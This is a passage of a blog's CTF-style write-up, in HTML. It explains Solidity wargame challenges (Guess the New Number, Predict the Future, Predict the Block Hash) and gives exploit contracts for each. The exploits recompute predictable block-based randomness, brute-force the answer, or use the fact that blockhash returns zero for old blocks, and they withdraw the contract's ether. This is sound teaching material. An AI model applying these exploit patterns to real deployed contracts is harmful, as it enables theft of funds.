+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span><span style="color:#66d9ef">function</span> <span style="color:#a6e22e">guess</span>(<span style="color:#a6e22e">uint8</span> <span style="color:#a6e22e">n</span>) <span style="color:#66d9ef">public</span> <span style="color:#a6e22e">payable</span> {
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">require</span>(<span style="color:#a6e22e">msg</span>.<span style="color:#a6e22e">value</span> <span style="color:#f92672">==</span> <span style="color:#ae81ff">1</span> <span style="color:#a6e22e">ether</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">uint8</span> <span style="color:#a6e22e">answer</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">uint8</span>(<span style="color:#a6e22e">keccak256</span>(<span style="color:#a6e22e">block</span>.<span style="color:#a6e22e">blockhash</span>(<span style="color:#a6e22e">block</span>.<span style="color:#a6e22e">number</span> <span style="color:#f92672">-</span> <span style="color:#ae81ff">1</span>), <span style="color:#a6e22e">now</span>));
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">n</span> <span style="color:#f92672">==</span> <span style="color:#a6e22e">answer</span>) {
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">msg</span>.<span style="color:#a6e22e">sender</span>.<span style="color:#a6e22e">transfer</span>(<span style="color:#ae81ff">2</span> <span style="color:#a6e22e">ether</span>);
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><h4 id="demystifying-solution-6">
+  Demystifying Solution:
+  <a href="#demystifying-solution-6" class="h-anchor" aria-hidden="true">#</a>
+</h4>
+<p>The answer variable is deterministic which means it can&rsquo;t be a source for randomness and therefore can be determined for different contracts as the same variable.</p>
+<p>The solution contract sets an interface for the GuessTheNewNumberChallenge&rsquo;s contract guess() method:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span><span style="color:#66d9ef">interface</span> <span style="color:#a6e22e">IGuessTheNewNumberChallenge</span> {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">guess</span>(<span style="color:#a6e22e">uint8</span>) <span style="color:#a6e22e">payable</span> <span style="color:#a6e22e">external</span>;
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>Which allow us to call the guess method directly from the solution contract.</p>
+<p>The Exploit() method simulate the guess() method functionality while simultaneously calling the instance guess() method with the true guess:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span><span style="color:#66d9ef">function</span> <span style="color:#a6e22e">Exploit</span>() <span style="color:#a6e22e">external</span> {
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">uint8</span> <span style="color:#a6e22e">answer</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">uint8</span>(<span style="color:#a6e22e">keccak256</span>(<span style="color:#a6e22e">block</span>.<span style="color:#a6e22e">blockhash</span>(<span style="color:#a6e22e">block</span>.<span style="color:#a6e22e">number</span> <span style="color:#f92672">-</span> <span style="color:#ae81ff">1</span>), <span style="color:#a6e22e">now</span>));
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">instance</span>.<span style="color:#a6e22e">guess</span>{<span style="color:#a6e22e">value</span><span style="color:#f92672">:</span> <span style="color:#ae81ff">1</span> <span style="color:#a6e22e">ether</span>}(<span style="color:#a6e22e">answer</span>);
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>And by calling the Exploit() you’ll have the full solution for your instance.</p>
+<p>Make sure to set a receive() fallback function to receive the transfered 2 ether in the solution contract and tansfer it to the wallet address:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span><span style="color:#a6e22e">receive</span>() <span style="color:#a6e22e">external</span> <span style="color:#a6e22e">payable</span> {
+</span></span><span style="display:flex;"><span>    (<span style="color:#a6e22e">bool</span> <span style="color:#a6e22e">success</span>,) <span style="color:#f92672">=</span> <span style="color:#a6e22e">msg</span>.<span style="color:#a6e22e">sender</span>.<span style="color:#a6e22e">call</span>{<span style="color:#a6e22e">value</span><span style="color:#f92672">:</span><span style="color:#a6e22e">address</span>(<span style="color:#66d9ef">this</span>).<span style="color:#a6e22e">balance</span>}(<span style="color:#e6db74">&#34;&#34;</span>);
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><h3 id="challenge-8-predict-the-future">
+  CHALLENGE 8: PREDICT THE FUTURE
+  <a href="#challenge-8-predict-the-future" class="h-anchor" aria-hidden="true">#</a>
+</h3>
+<h4 id="objective-7">
+  Objective:
+  <a href="#objective-7" class="h-anchor" aria-hidden="true">#</a>
+</h4>
+<ul>
+<li>Guess the number before the random number is generated.</li>
+</ul>
+<h4 id="demystifying-contract-6">
+  Demystifying Contract:
+  <a href="#demystifying-contract-6" class="h-anchor" aria-hidden="true">#</a>
+</h4>
+<p>The contract is constructed based on different functions, The first three lines are defining three variables:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span><span style="color:#a6e22e">address</span> <span style="color:#a6e22e">guesser</span>;
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">uint8</span> <span style="color:#a6e22e">guess</span>;
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">uint256</span> <span style="color:#a6e22e">settlementBlockNumber</span>;
+</span></span></code></pre></div><p>The first line is the guesser address, The second line is the guess variable and the third line is the settlementBlockNumber variable.</p>
+<p>The PredictTheFutureChallenge() method requires the transfered value equal to 1 ether to initiate the challange:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span><span style="color:#66d9ef">function</span> <span style="color:#a6e22e">PredictTheFutureChallenge</span>() <span style="color:#66d9ef">public</span> <span style="color:#a6e22e">payable</span> {
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">require</span>(<span style="color:#a6e22e">msg</span>.<span style="color:#a6e22e">value</span> <span style="color:#f92672">==</span> <span style="color:#ae81ff">1</span> <span style="color:#a6e22e">ether</span>);
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>The isComplete() method returns true if the address balance is 0:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span><span style="color:#66d9ef">function</span> <span style="color:#a6e22e">isComplete</span>() <span style="color:#66d9ef">public</span> <span style="color:#a6e22e">view</span> <span style="color:#a6e22e">returns</span> (<span style="color:#a6e22e">bool</span>) {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">address</span>(<span style="color:#66d9ef">this</span>).<span style="color:#a6e22e">balance</span> <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>The lockInGuess() method requires the guesser address not initiated and requires the transfered value equal to 1 ether:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span><span style="color:#66d9ef">function</span> <span style="color:#a6e22e">lockInGuess</span>(<span style="color:#a6e22e">uint8</span> <span style="color:#a6e22e">n</span>) <span style="color:#66d9ef">public</span> <span style="color:#a6e22e">payable</span> {
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">require</span>(<span style="color:#a6e22e">guesser</span> <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">require</span>(<span style="color:#a6e22e">msg</span>.<span style="color:#a6e22e">value</span> <span style="color:#f92672">==</span> <span style="color:#ae81ff">1</span> <span style="color:#a6e22e">ether</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">guesser</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">msg</span>.<span style="color:#a6e22e">sender</span>;
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">guess</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">n</span>;
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">settlementBlockNumber</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">block</span>.<span style="color:#a6e22e">number</span> <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>;
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>The lockInGuess() method lock in the guess by initiating the guesser address, the guess variable and the settlementBlockNumber variable to validate that the guess is locked in.</p>
+<p>The settle() method requires the caller address equal to the guesser address and the current block number bigger than the settlementBlockNumber variable to validate the guess as locked in:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span><span style="color:#66d9ef">function</span> <span style="color:#a6e22e">settle</span>() <span style="color:#66d9ef">public</span> {
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">require</span>(<span style="color:#a6e22e">msg</span>.<span style="color:#a6e22e">sender</span> <span style="color:#f92672">==</span> <span style="color:#a6e22e">guesser</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">require</span>(<span style="color:#a6e22e">block</span>.<span style="color:#a6e22e">number</span> <span style="color:#f92672">&gt;</span> <span style="color:#a6e22e">settlementBlockNumber</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">uint8</span> <span style="color:#a6e22e">answer</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">uint8</span>(<span style="color:#a6e22e">keccak256</span>(<span style="color:#a6e22e">block</span>.<span style="color:#a6e22e">blockhash</span>(<span style="color:#a6e22e">block</span>.<span style="color:#a6e22e">number</span> <span style="color:#f92672">-</span> <span style="color:#ae81ff">1</span>), <span style="color:#a6e22e">now</span>)) <span style="color:#f92672">%</span> <span style="color:#ae81ff">10</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">guesser</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">guess</span> <span style="color:#f92672">==</span> <span style="color:#a6e22e">answer</span>) {
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">msg</span>.<span style="color:#a6e22e">sender</span>.<span style="color:#a6e22e">transfer</span>(<span style="color:#ae81ff">2</span> <span style="color:#a6e22e">ether</span>);
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>The answer variable is initiated to the unsigned integer of the hash of the block number modulo 10, The guesser address is set to 0 to validate the next locked in guess and the balance is transfered back if the guess variable is equal to the answer variable.</p>
+<h4 id="demystifying-solution-7">
+  Demystifying Solution:
+  <a href="#demystifying-solution-7" class="h-anchor" aria-hidden="true">#</a>
+</h4>
+<p>The answer variable is initiated to the unsigned integer of the hash of the block number modulo 10 which sets the answer variable in the range of 0 to 9.</p>
+<p>The solution contract sets an interface for the PredictTheFutureChallenge&rsquo;s contract lockInGuess() method and settle() method:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span><span style="color:#66d9ef">interface</span> <span style="color:#a6e22e">IPredictTheFutureChallenge</span>  {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">lockInGuess</span>(<span style="color:#a6e22e">uint8</span>) <span style="color:#a6e22e">payable</span> <span style="color:#a6e22e">external</span>;
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">settle</span>() <span style="color:#a6e22e">external</span>;
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>Which allow us to call the settle method directly from the solution contract.</p>
+<p>The lockInGuess() method lock in the guess by initiating the guess variable to 0:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span><span style="color:#66d9ef">function</span> <span style="color:#a6e22e">lockInGuess</span>() <span style="color:#66d9ef">public</span> <span style="color:#a6e22e">payable</span> {
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">instance</span>.<span style="color:#a6e22e">lockInGuess</span>.{<span style="color:#a6e22e">value</span><span style="color:#f92672">:</span> <span style="color:#ae81ff">1</span> <span style="color:#a6e22e">ether</span>}(<span style="color:#ae81ff">0</span>);
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>The Exploit() method simulate the settle() method functionality while simultaneously calling the instance settle() method with the true guess:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span><span style="color:#66d9ef">function</span> <span style="color:#a6e22e">Exploit</span>() <span style="color:#a6e22e">external</span> {
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">uint8</span> <span style="color:#a6e22e">answer</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">uint8</span>(<span style="color:#a6e22e">keccak256</span>(<span style="color:#a6e22e">block</span>.<span style="color:#a6e22e">blockhash</span>(<span style="color:#a6e22e">block</span>.<span style="color:#a6e22e">number</span> <span style="color:#f92672">-</span> <span style="color:#ae81ff">1</span>), <span style="color:#a6e22e">now</span>)) <span style="color:#f92672">%</span> <span style="color:#ae81ff">10</span>;
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">require</span>(<span style="color:#a6e22e">answer</span> <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>);
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">instance</span>.<span style="color:#a6e22e">settle</span>();
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>The Exploit() method requires only the true answer to be settled and therefore we can manually brute-force from 0 to 9 until we settle the true answer that validates the requirement.</p>
+<p>Make sure to set a receive() fallback function to receive the transfered 2 ether in the solution contract and tansfer it to the wallet address:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span><span style="color:#a6e22e">receive</span>() <span style="color:#a6e22e">external</span> <span style="color:#a6e22e">payable</span> {
+</span></span><span style="display:flex;"><span>    (<span style="color:#a6e22e">bool</span> <span style="color:#a6e22e">success</span>,) <span style="color:#f92672">=</span> <span style="color:#a6e22e">msg</span>.<span style="color:#a6e22e">sender</span>.<span style="color:#a6e22e">call</span>{<span style="color:#a6e22e">value</span><span style="color:#f92672">:</span><span style="color:#a6e22e">address</span>(<span style="color:#66d9ef">this</span>).<span style="color:#a6e22e">balance</span>}(<span style="color:#e6db74">&#34;&#34;</span>);
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><h3 id="challenge-9-predict-the-block-hash">
+  CHALLENGE 9: PREDICT THE BLOCK HASH
+  <a href="#challenge-9-predict-the-block-hash" class="h-anchor" aria-hidden="true">#</a>
+</h3>
+<h4 id="objective-8">
+  Objective:
+  <a href="#objective-8" class="h-anchor" aria-hidden="true">#</a>
+</h4>
+<ul>
+<li>Guess the block hash for a future block.</li>
+</ul>
+<h4 id="demystifying-contract-7">
+  Demystifying Contract:
+  <a href="#demystifying-contract-7" class="h-anchor" aria-hidden="true">#</a>
+</h4>
+<p>The contract is constructed based on different functions, The first three lines are defining three variables:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span><span style="color:#a6e22e">address</span> <span style="color:#a6e22e">guesser</span>;
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">uint8</span> <span style="color:#a6e22e">guess</span>;
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">uint256</span> <span style="color:#a6e22e">settlementBlockNumber</span>;
+</span></span></code></pre></div><p>The first line is the guesser address, The second line is the guess variable and the third line is the settlementBlockNumber variable.</p>
+<p>The PredictTheBlockHashChallenge() method requires the transfered value equal to 1 ether to initiate the challange:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span><span style="color:#66d9ef">function</span> <span style="color:#a6e22e">PredictTheBlockHashChallenge</span>() <span style="color:#66d9ef">public</span> <span style="color:#a6e22e">payable</span> {
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">require</span>(<span style="color:#a6e22e">msg</span>.<span style="color:#a6e22e">value</span> <span style="color:#f92672">==</span> <span style="color:#ae81ff">1</span> <span style="color:#a6e22e">ether</span>);
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>The isComplete() method returns true if the address balance is 0:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span><span style="color:#66d9ef">function</span> <span style="color:#a6e22e">isComplete</span>() <span style="color:#66d9ef">public</span> <span style="color:#a6e22e">view</span> <span style="color:#a6e22e">returns</span> (<span style="color:#a6e22e">bool</span>) {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">address</span>(<span style="color:#66d9ef">this</span>).<span style="color:#a6e22e">balance</span> <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>The lockInGuess() method requires the guesser address not initiated and requires the transfered value equal to 1 ether:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span><span style="color:#66d9ef">function</span> <span style="color:#a6e22e">lockInGuess</span>(<span style="color:#a6e22e">bytes32</span> <span style="color:#a6e22e">hash</span>) <span style="color:#66d9ef">public</span> <span style="color:#a6e22e">payable</span> {
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">require</span>(<span style="color:#a6e22e">guesser</span> <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">require</span>(<span style="color:#a6e22e">msg</span>.<span style="color:#a6e22e">value</span> <span style="color:#f92672">==</span> <span style="color:#ae81ff">1</span> <span style="color:#a6e22e">ether</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">guesser</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">msg</span>.<span style="color:#a6e22e">sender</span>;
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">guess</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">hash</span>;
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">settlementBlockNumber</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">block</span>.<span style="color:#a6e22e">number</span> <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>;
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>The lockInGuess() method lock in the guess by initiating the guesser address, the guess variable and the settlementBlockNumber variable to validate that the guess is locked in.</p>
+<p>The settle() method requires the caller address equal to the guesser address and the current block number bigger than the settlementBlockNumber variable to validate the guess as locked in:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span><span style="color:#66d9ef">function</span> <span style="color:#a6e22e">settle</span>() <span style="color:#66d9ef">public</span> {
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">require</span>(<span style="color:#a6e22e">msg</span>.<span style="color:#a6e22e">sender</span> <span style="color:#f92672">==</span> <span style="color:#a6e22e">guesser</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">require</span>(<span style="color:#a6e22e">block</span>.<span style="color:#a6e22e">number</span> <span style="color:#f92672">&gt;</span> <span style="color:#a6e22e">settlementBlockNumber</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">bytes32</span> <span style="color:#a6e22e">answer</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">block</span>.<span style="color:#a6e22e">blockhash</span>(<span style="color:#a6e22e">settlementBlockNumber</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">guesser</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">guess</span> <span style="color:#f92672">==</span> <span style="color:#a6e22e">answer</span>) {
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">msg</span>.<span style="color:#a6e22e">sender</span>.<span style="color:#a6e22e">transfer</span>(<span style="color:#ae81ff">2</span> <span style="color:#a6e22e">ether</span>);
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>The answer variable is initiated to the block hash of the settlementBlockNumber variable, The guesser address is set to 0 to validate the next locked in guess and the balance is transfered back if the guess variable is equal to the answer variable.</p>
+<h4 id="demystifying-solution-8">
+  Demystifying Solution:
+  <a href="#demystifying-solution-8" class="h-anchor" aria-hidden="true">#</a>
+</h4>
+<p>The answer variable is initiated to the block hash of the settlementBlockNumber variable, However due to the block hashes are not available for all blocks for scalability reasons. You can only access the hashes of the most recent 256 blocks, all other values will be zero, And therefore we can wait for 256 blocks after lock in the guess and the answer can be validated by 0.</p>
+<p>The solution contract sets an interface for the PredictTheBlockHashChallenge&rsquo;s contract lockInGuess() method and settle() method:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span><span style="color:#66d9ef">interface</span> <span style="color:#a6e22e">IPredictTheBlockHashChallenge</span>   {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">lockInGuess</span>(<span style="color:#a6e22e">bytes32</span>) <span style="color:#a6e22e">payable</span> <span style="color:#a6e22e">external</span>;
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">settle</span>() <span style="color:#a6e22e">external</span>;
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>Which allow us to call the settle method directly from the solution contract.</p>
+<p>The lockInGuess() method lock in the guess by initiating the guess variable to 0:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span><span style="color:#66d9ef">function</span> <span style="color:#a6e22e">lockInGuess</span>() <span style="color:#66d9ef">public</span> <span style="color:#a6e22e">payable</span> {
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">instance</span>.<span style="color:#a6e22e">lockInGuess</span>.{<span style="color:#a6e22e">value</span><span style="color:#f92672">:</span> <span style="color:#ae81ff">1</span> <span style="color:#a6e22e">ether</span>}(<span style="color:#ae81ff">0x0000000000000000000000000000000000000000000000000000000000000000</span>);
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>The Exploit() method simulate the settle() method functionality:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span><span style="color:#66d9ef">function</span> <span style="color:#a6e22e">Exploit</span>() <span style="color:#a6e22e">external</span> {
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">instance</span>.<span style="color:#a6e22e">settle</span>();
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>The Exploit() method requires to be called only after 257 blocks to be able to settle the true guess.</p>
+<p>Make sure to set a receive() fallback function to receive the transfered 2 ether in the solution contract and tansfer it to the wallet address:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span><span style="color:#a6e22e">receive</span>() <span style="color:#a6e22e">external</span> <span style="color:#a6e22e">payable</span> {
+</span></span><span style="display:flex;"><span>    (<span style="color:#a6e22e">bool</span> <span style="color:#a6e22e">success</span>,) <span style="color:#f92672">=</span> <span style="color:#a6e22e">msg</span>.<span style="color:#a6e22e">sender</span>.<span style="color:#a6e22e">call</span>{<span style="color:#a6e22e">value</span><span style="color:#f92672">:</span><span style="color:#a6e22e">address</span>(<span style="color:#66d9ef">this</span>).<span style="color:#a6e22e">balance</span>}(<span style="color:#e6db74">&#34;&#34;</span>);
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div>
+    </div>
+    
+      
+        <div class="pagination">
+          <div class="pagination__title">
+            <span class="pagination__title-h"
+              >Read other posts</span
+            >
+            <hr />
+          </div>
+          <div class="pagination__buttons">
+            
+            
+              <span class="button next">
+                <a href="/post/demystifying-solidity-wargames-openzeppelins-ethernaut/">
+                  <span class="button__text">Demystifying Solidity Wargames: Openzeppelin&#39;s ethernaut</span>
+                  <span class="button__icon">→</span>
+                </a>
+              </span>
+            
+          </div>
+        </div>
+      
+    
+
+    
+      
+        
+
+      
+    
+  </article>
+
+      </div>
+
+      
+        <footer class="footer">
+  <div class="footer__inner">
+    
+      <a
+  href="/"
+  class="logo"
+  style="text-decoration: none;"
+>
+  
+
+    <span class="logo__text"
+      >AHZ</span
+    >
+
+  
+</a>
+
+      <div class="copyright">
+        <span>© 2023. All rights reserved.</span>
+
+      </div>
+    
+  </div>
+</footer>
+
+
+
+
+
+<script type="text/javascript" src="/bundle.min.js"></script>
+
+
+      
+    </div>
+
+    
+  </body>
+</html>
